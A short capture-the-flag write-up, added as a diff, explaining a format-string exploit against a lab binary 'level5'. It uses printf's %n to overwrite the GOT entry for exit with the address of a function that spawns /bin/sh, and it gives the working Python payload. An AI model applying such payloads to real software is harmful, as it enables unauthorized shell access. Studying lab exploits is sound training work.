@@ -1,0 +1,18 @@
+With info func in gdb, wee see the function "o" who calls system("/bin/sh"); but it is not called
+by the main or the "n" function.
+
+We also see that the n function calls "exit", but not the implementation, it's just a jump to a pointer to an adress:
+
+(gdb) disass 0x80483d0
+Dump of assembler code for function exit@plt:
+   0x080483d0 <+0>:	jmp    *0x8049838
+
+We want to replace the content of the adress 0x8049838 by the adress of the "o" function
+(adress 0x80484a4, 134513828 in dec) to get what we want
+
+We will again exploit printf with the %n modifier, this time we must use it at the 4th argument:
+
+python -c "print '\x38\x98\x04\x08%+.134513823d%4\$n'" > /tmp/lvl5
+cat /tmp/lvl5 - | ./level5
+
+After the long printf we have a shell and we can cat the flag
